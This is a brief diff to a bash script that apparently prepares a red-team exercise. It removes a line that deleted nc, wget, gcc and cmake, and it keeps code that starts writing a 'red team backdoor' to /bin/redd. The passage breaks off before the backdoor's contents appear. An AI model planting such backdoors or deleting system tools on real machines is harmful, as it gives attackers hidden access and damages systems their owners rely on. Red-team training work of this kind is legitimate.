@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# Remove nc, wget, gcc, cmake, etc.
-rm "$(which nc)" "$(which wget)" "$(which gcc)" "$(which cmake)" 2>/dev/null
-
 # red team backdoor (/bin/redd)
 cat << 'EOF' > /bin/redd
 #!/bin/bash
